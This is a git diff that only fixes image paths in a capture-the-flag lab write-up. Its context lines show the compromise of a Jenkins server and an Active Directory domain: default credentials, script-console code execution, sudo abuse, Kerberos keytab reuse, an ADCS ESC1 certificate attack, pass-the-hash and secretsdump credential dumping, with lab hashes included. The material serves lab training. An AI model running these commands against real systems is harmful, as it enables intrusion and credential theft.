@@ -2,7 +2,7 @@
 
 ## Anomaly
 
-![image.png](<../.gitbook/assets/image (2).png>)
+![image.png](<../../.gitbook/assets/image (2).png>)
 
 ### **Objective and Scope**
 
@@ -249,9 +249,9 @@ ffuf -u "http://10.1.107.2:8080/FUZZ" \
 gobuster dir -u http://10.1.107.2:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip
 ```
 
-![image.png](<../.gitbook/assets/image 1 (5).png>)
+![image.png](<../../.gitbook/assets/image 1 (5).png>)
 
-![image.png](<../.gitbook/assets/image 2 (4).png>)
+![image.png](<../../.gitbook/assets/image 2 (4).png>)
 
 _**Subdomains and Virtual Hosts**_
 
@@ -263,7 +263,7 @@ ffuf -u http:/anomaly.Web  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdom
 
 _**Check web functionality**_
 
-![image.png](<../.gitbook/assets/image 3 (4).png>)
+![image.png](<../../.gitbook/assets/image 3 (4).png>)
 
 * We have a jenkins instance and we need to enumerate more
 
@@ -283,9 +283,9 @@ curl -I http:/10.1.107.2:8080 | grep -i "x-jenkins"
 curl -s http://10.1.107.2:8080/login | grep "Jenkins ver"
 ```
 
-![image.png](<../.gitbook/assets/image 4 (4).png>)
+![image.png](<../../.gitbook/assets/image 4 (4).png>)
 
-![image.png](<../.gitbook/assets/image 5 (4).png>)
+![image.png](<../../.gitbook/assets/image 5 (4).png>)
 
 * Jenkins version disclosure
 * we can search for available vulnerabilities regarding `jenkins 2.452.1`
@@ -301,7 +301,7 @@ admin:jenkins
 user:user
 ```
 
-![image.png](<../.gitbook/assets/image 6 (3).png>)
+![image.png](<../../.gitbook/assets/image 6 (3).png>)
 
 * `admin:admin` creds worked
 
@@ -316,7 +316,7 @@ proc.waitForOrKill(1000)
 println sout
 ```
 
-![image.png](<../.gitbook/assets/image 7 (3).png>)
+![image.png](<../../.gitbook/assets/image 7 (3).png>)
 
 * a successful Remote Code Execution (RCE) on a Jenkins instance using the **Script Console** (`/script`). The Groovy script executed the `id` command, confirming that the application is running as the `jenkins` user
 *   Now we want to obtain a reverse shell
@@ -346,7 +346,7 @@ println sout
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 8 (3).png>)
+    ![image.png](<../../.gitbook/assets/image 8 (3).png>)
 
     * **`secrets/` directory:** This is where Jenkins stores its encryption keys (like `master.key` and `hudson.util.Secret`). You can use these to decrypt any stored credentials or build parameters.
     * **`jobs/` directory:** Contains build configurations. Check these for hardcoded passwords, API keys, or scripts that might contain sensitive information.
@@ -424,7 +424,7 @@ jenkins@ip-10-1-107-2:~$ cat users/admin_12913718988981174255/config.xml
 
 ```
 
-![image.png](<../.gitbook/assets/image 9 (5).png>)
+![image.png](<../../.gitbook/assets/image 9 (5).png>)
 
 *   We obtained a password hash that is a jbcrypt
 
@@ -433,7 +433,7 @@ jenkins@ip-10-1-107-2:~$ cat users/admin_12913718988981174255/config.xml
     hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
     ```
 
-    ![image.png](<../.gitbook/assets/image 10 (5).png>)
+    ![image.png](<../../.gitbook/assets/image 10 (5).png>)
 
     * Tried cracking the password but it was taking a long time.
 
@@ -452,7 +452,7 @@ jenkins@ip-10-1-107-2:~$
 
 ```
 
-![image.png](<../.gitbook/assets/image 11 (5).png>)
+![image.png](<../../.gitbook/assets/image 11 (5).png>)
 
 *   discovered **NOPASSWD** permissions to run `/usr/bin/router_config` as any user (including **root**)
 
@@ -465,11 +465,11 @@ jenkins@ip-10-1-107-2:~$
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 12 (5).png>)
+    ![image.png](<../../.gitbook/assets/image 12 (5).png>)
 
     *   navigate to /root and `cat` the user flag
 
-        ![image.png](<../.gitbook/assets/image 13 (5).png>)
+        ![image.png](<../../.gitbook/assets/image 13 (5).png>)
 
 ## Anomaly-DC `10.1.69.52`
 
@@ -604,7 +604,7 @@ Host script results:
 * This is an active directory and we do not have any creds to start with
 *   Simple things first, lets try to authenticate with null creds
 
-    ![image.png](<../.gitbook/assets/image 14 (5).png>)
+    ![image.png](<../../.gitbook/assets/image 14 (5).png>)
 
 #### _**Generating host files**_
 
@@ -613,7 +613,7 @@ nxc smb anomaly.hsm  -u '' -p '' --generate-hosts-file hosts
 
 ```
 
-![image.png](<../.gitbook/assets/image 15 (3).png>)
+![image.png](<../../.gitbook/assets/image 15 (3).png>)
 
 #### _**Enumerating users**_
 
@@ -627,9 +627,9 @@ kerbrute userenum -d anomaly.hsm --dc 10.1.69.52 /usr/share/seclists/Usernames/x
 
 ```
 
-![image.png](<../.gitbook/assets/image 16 (3).png>)
+![image.png](<../../.gitbook/assets/image 16 (3).png>)
 
-![image.png](<../.gitbook/assets/image 17 (4).png>)
+![image.png](<../../.gitbook/assets/image 17 (4).png>)
 
 * We failed to Enumerate usernames with three different approaches
 * Lets enumerate other services next
@@ -645,7 +645,7 @@ kerbrute userenum -d anomaly.hsm --dc 10.1.69.52 /usr/share/seclists/Usernames/x
 RedBlue@Frank Anomaly % 
 ```
 
-![image.png](<../.gitbook/assets/image 18 (2).png>)
+![image.png](<../../.gitbook/assets/image 18 (2).png>)
 
 * Nothing of interest obtained
 
@@ -656,7 +656,7 @@ _**Enumerating ldap-**_**&#x20;389**
 ldapsearch -H ldap://**10.1.69.52 **-x -s base namingcontexts**
 ```
 
-![image.png](<../.gitbook/assets/image 19 (4).png>)
+![image.png](<../../.gitbook/assets/image 19 (4).png>)
 
 ```bash
 ldapsearch -H ldap://10.1.69.52 -x -s base -b "DC=anomaly,DC=hsm"
@@ -664,7 +664,7 @@ ldapsearch -H ldap://10.1.69.52 -x -b "DC=anomaly,DC=hsm" "(objectClass=user)"
 
 ```
 
-![image.png](<../.gitbook/assets/image 20 (4).png>)
+![image.png](<../../.gitbook/assets/image 20 (4).png>)
 
 * Nothing too interesting here either
 
@@ -693,9 +693,9 @@ gobuster dir -u http://10.1.69.52 -w /usr/share/wordlists/dirbuster/directory-li
 
 * Used linpeas to uncover these.
 
-![image.png](<../.gitbook/assets/image 21 (4).png>)
+![image.png](<../../.gitbook/assets/image 21 (4).png>)
 
-![image.png](<../.gitbook/assets/image 22 (4).png>)
+![image.png](<../../.gitbook/assets/image 22 (4).png>)
 
 * The Anomaly-Web `10.1.107.2` is integrated with the Active Directory domain `ANOMALY.HSM`
 
@@ -718,7 +718,7 @@ gobuster dir -u http://10.1.69.52 -w /usr/share/wordlists/dirbuster/directory-li
     kadmin -k -t /etc/krb5.keytab -p Brandon_Boyd@ANOMALY.HSM
     ```
 
-    ![image.png](<../.gitbook/assets/image 23 (4).png>)
+    ![image.png](<../../.gitbook/assets/image 23 (4).png>)
 
     * obtained a valid **Ticket Granting Ticket (TGT)** for `Brandon_Boyd` stored in `/tmp/krb5cc_111`
 
@@ -730,7 +730,7 @@ https://github.com/sosdave/KeyTabExtract
 python3 keytabextract.py /etc/krb5.keytab
 ```
 
-![image.png](<../.gitbook/assets/image 24 (4).png>)
+![image.png](<../../.gitbook/assets/image 24 (4).png>)
 
 _**Using the AES key**_
 
@@ -740,7 +740,7 @@ nxc smb Anomaly-DC.anomaly.hsm -u Brandon_Boyd --aesKey f9754c5288b844eb86054695
 nxc smb Anomaly-DC.anomaly.hsm -u Brandon_Boyd --aesKey f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52 --shares
 ```
 
-![image.png](<../.gitbook/assets/image 25 (4).png>)
+![image.png](<../../.gitbook/assets/image 25 (4).png>)
 
 * We did not go any further
 * need to transfer `/tmp/krb5cc_111` to our VM
@@ -757,7 +757,7 @@ export KRB5CCNAME=krb5cc_111
 klist
 ```
 
-![image.png](<../.gitbook/assets/image 26 (4).png>)
+![image.png](<../../.gitbook/assets/image 26 (4).png>)
 
 ### Bloodhound -Collecting loot
 
@@ -765,15 +765,15 @@ klist
 bloodhound-python -k -no-pass -u Brandon_Boyd -d anomaly.hsm -dc Anomaly-DC.anomaly.hsm -ns 10.1.69.52 -c all
 ```
 
-![image.png](<../.gitbook/assets/image 27 (3).png>)
+![image.png](<../../.gitbook/assets/image 27 (3).png>)
 
 #### Bloodhound Enumeration
 
-![image.png](<../.gitbook/assets/image 28 (3).png>)
+![image.png](<../../.gitbook/assets/image 28 (3).png>)
 
 * `Anna_Molly` is in All domain admins
 
-![image.png](<../.gitbook/assets/image 29 (3).png>)
+![image.png](<../../.gitbook/assets/image 29 (3).png>)
 
 * Not much of an interest with `bradon_boyd` here
 * Performing further enumeration
@@ -782,7 +782,7 @@ bloodhound-python -k -no-pass -u Brandon_Boyd -d anomaly.hsm -dc Anomaly-DC.anom
 nxc smb anomaly.hsm -u Brandon_Boyd -d ANOMALY.HSM -k --users
 ```
 
-![image.png](<../.gitbook/assets/image 30 (4).png>)
+![image.png](<../../.gitbook/assets/image 30 (4).png>)
 
 * Obtained a clear password `3edc4rfv#EDC$RFV` from the description
 *   A user `anna_molly` is also present
@@ -791,7 +791,7 @@ nxc smb anomaly.hsm -u Brandon_Boyd -d ANOMALY.HSM -k --users
     nxc smb anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV'
     ```
 
-    ![image.png](<../.gitbook/assets/image 31 (3).png>)
+    ![image.png](<../../.gitbook/assets/image 31 (3).png>)
 
 #### Checking for quick wins
 
@@ -804,7 +804,7 @@ nxc smb anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M zerologon
 nxc smb  anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M gpp_autologin
 ```
 
-![image.png](<../.gitbook/assets/image 32 (3).png>)
+![image.png](<../../.gitbook/assets/image 32 (3).png>)
 
 * **Active Directory Certificate Services (ADCS)** is running on the Domain Controller.
 
@@ -931,7 +931,7 @@ certipy req \
  certipy account -u 'Brandon_Boyd' -p '3edc4rfv#EDC$RFV' -dc-ip '10.1.69.52' -user 'anna_molly' read
 ```
 
-![image.png](<../.gitbook/assets/image 33 (3).png>)
+![image.png](<../../.gitbook/assets/image 33 (3).png>)
 
 ```bash
 RedBlue@Frank Anomaly %  certipy-ad account -u 'Brandon_Boyd' -p '3edc4rfv#EDC$RFV' -dc-ip '10.1.69.52' -user 'anna_molly' read                 
@@ -956,7 +956,7 @@ _**Authenticate using the obtained certificate**_
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 ```
 
-![image.png](<../.gitbook/assets/image 34 (2).png>)
+![image.png](<../../.gitbook/assets/image 34 (2).png>)
 
 *   **cannot enroll directly** as `Brandon_Boyd`
 
@@ -981,7 +981,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         -computer-pass RedBlue777
         ```
 
-        ![image.png](<../.gitbook/assets/image 35 (2).png>)
+        ![image.png](<../../.gitbook/assets/image 35 (2).png>)
 
         _Requesting the certificate with the computer account_
 
@@ -996,7 +996,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 
         ```
 
-        ![image.png](<../.gitbook/assets/image 36 (2).png>)
+        ![image.png](<../../.gitbook/assets/image 36 (2).png>)
 
         * This trick failed and we might want to use the computer account to grant Brandon\_Boyd permission to unlock the template
 
@@ -1016,7 +1016,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         -save-configuration CertAdmin.conf
         ```
 
-        ![image.png](<../.gitbook/assets/image 37 (2).png>)
+        ![image.png](<../../.gitbook/assets/image 37 (2).png>)
 
         _**Edit the Configuration File**_
 
@@ -1024,7 +1024,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 
         Add **`ANOMALY.HSM\Brandon_Boyd`** to that list.
 
-        ![image.png](<../.gitbook/assets/image 38 (2).png>)
+        ![image.png](<../../.gitbook/assets/image 38 (2).png>)
 
         * Editing the `nTSecurityDescriptor` in hex manually is a nightmare because it’s a binary structure
         * Pushing the changes now wont work
@@ -1053,7 +1053,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 
         ```
 
-        ![image.png](<../.gitbook/assets/image 39 (2).png>)
+        ![image.png](<../../.gitbook/assets/image 39 (2).png>)
 
         _**Perform the ESC1 Attack as Brandon**_
 
@@ -1070,7 +1070,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         -debug
         ```
 
-        ![image.png](<../.gitbook/assets/image 40 (2).png>)
+        ![image.png](<../../.gitbook/assets/image 40 (2).png>)
 
         ### Authenticate as `anna_molly`
 
@@ -1078,7 +1078,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         certipy-ad auth -pfx 'anna_molly.pfx' -dc-ip '10.1.69.52'
         ```
 
-        ![image.png](<../.gitbook/assets/image 41 (1).png>)
+        ![image.png](<../../.gitbook/assets/image 41 (1).png>)
 
         ```bash
         evil-winrm -i 10.1.69.52 -u 'anna_molly' -H 'be4bf3131851aee9a424c58e02879f6e'
@@ -1086,7 +1086,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         Get-ChildItem -Path C:\ -Include '*root.txt' -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "=== $($_.FullName) ==="; Get-Content -Raw -Encoding UTF8 $_.FullName }
         ```
 
-        ![image.png](<../.gitbook/assets/image 42 (1).png>)
+        ![image.png](<../../.gitbook/assets/image 42 (1).png>)
 
         * Tried evil-winrm but then the port was not open !!!!!!!!
         * IT SAVES TIME TO READ SOMETIMES HHAHAHAHA!!!!
@@ -1097,7 +1097,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
         impacket-psexec 'anomaly.hsm/anna_molly@10.1.69.52' -hashes ':be4bf3131851aee9a424c58e02879f6e'
         ```
 
-        ![image.png](<../.gitbook/assets/image 43 (1).png>)
+        ![image.png](<../../.gitbook/assets/image 43 (1).png>)
 
         * Not successful this time
 
@@ -1107,7 +1107,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 nxc smb 10.1.69.52 -u 'anna_molly' -H 'be4bf3131851aee9a424c58e02879f6e'
 ```
 
-![image.png](<../.gitbook/assets/image 44 (2).png>)
+![image.png](<../../.gitbook/assets/image 44 (2).png>)
 
 #### Domain Admin (Secretsdump)
 
@@ -1115,7 +1115,7 @@ nxc smb 10.1.69.52 -u 'anna_molly' -H 'be4bf3131851aee9a424c58e02879f6e'
 impacket-secretsdump -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52'
 ```
 
-![image.png](<../.gitbook/assets/image 45 (2).png>)
+![image.png](<../../.gitbook/assets/image 45 (2).png>)
 
 ```bash
 Local Administrator Hash: 31592a42841d0a9e74f93c41d8884cd0
@@ -1131,7 +1131,7 @@ xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f
 xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f93c41d8884cd0 /cert:ignore /restricted-admin /sec:tls /dynamic-resolution +clipboard
 ```
 
-![image.png](<../.gitbook/assets/image 46 (2).png>)
+![image.png](<../../.gitbook/assets/image 46 (2).png>)
 
 * `HYBRID_REQUIRED_BY_SERVER` is the definitive sign that **NLA (Network Level Authentication)** is strictly enforced on the Domain Controller. In this state, the server refuses to even negotiate a TLS connection unless it can verify your identity first.
 *   Since we are using a hash, we need to enable **`Restricted Admin Mode`** on the target. This allows NLA to complete using NTLM (your hash) instead of a password.
@@ -1140,7 +1140,7 @@ xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f
     impacket-wmiexec -hashes ':31592a42841d0a9e74f93c41d8884cd0' 'Administrator@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
     ```
 
-    ![image.png](<../.gitbook/assets/image 47 (2).png>)
+    ![image.png](<../../.gitbook/assets/image 47 (2).png>)
 
     * **local** `Administrator` account (RID 500) is either disabled or restricted from network logons
     *   Since we know `anna_molly` has the rights to start services and read the registry (proven by `secretsdump`), we shall use it to enable **Restricted Admin Mode** for the whole system
@@ -1165,7 +1165,7 @@ xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f
         xfreerdp3 /v:10.1.69.52 /u:anna_molly /d:anomaly.hsm /pth:be4bf3131851aee9a424c58e02879f6e /cert:ignore /restricted-admin /dynamic-resolution +clipboard /drive:$(pwd),share
         ```
 
-        ![image.png](<../.gitbook/assets/image 48 (2).png>)
+        ![image.png](<../../.gitbook/assets/image 48 (2).png>)
 
         * `psexec` successfully **uploaded** the binary, **created** the service, and **started** it. The "Error performing uninstallation" simply means the RPC connection died before the service could report its final exit code back to your Kali machine.
 
@@ -1175,7 +1175,7 @@ xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f
     xfreerdp3 /v:10.1.69.52 /u:anna_molly /d:anomaly.hsm /pth:be4bf3131851aee9a424c58e02879f6e /cert:ignore /restricted-admin /dynamic-resolution +clipboard /drive:$(pwd),share
     ```
 
-    ![image.png](<../.gitbook/assets/image 49 (2).png>)
+    ![image.png](<../../.gitbook/assets/image 49 (2).png>)
 
     * **"Account restrictions are preventing this user from signing in"** is the classic symptom of a successful connection where **Restricted Admin Mode** is still technically disabled or being blocked by a local policy
 
@@ -1187,7 +1187,7 @@ _**Use\*\*\*\*****&#x20;****`atexec`****&#x20;****\*\*\*\*(The Task Scheduler)**
 impacket-atexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
 ```
 
-![image.png](<../.gitbook/assets/image 50 (1).png>)
+![image.png](<../../.gitbook/assets/image 50 (1).png>)
 
 _**Add\*\*\*\*****&#x20;****`anna_molly`****&#x20;****\*\*\*\*to the RDP Group**_
 
@@ -1201,8 +1201,8 @@ impacket-atexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_mo
 xfreerdp3 /v:10.1.69.52 /u:anna_molly /d:anomaly.hsm /pth:be4bf3131851aee9a424c58e02879f6e /cert:ignore /restricted-admin /dynamic-resolution +clipboard /drive:$(pwd),share
 ```
 
-![image.png](<../.gitbook/assets/image 51 (1).png>)
+![image.png](<../../.gitbook/assets/image 51 (1).png>)
 
 #### BOOM ROOOOOOOOOOOOOOOOOOT!!!!!
 
-![image.png](<../.gitbook/assets/image 52 (1).png>)
+![image.png](<../../.gitbook/assets/image 52 (1).png>)
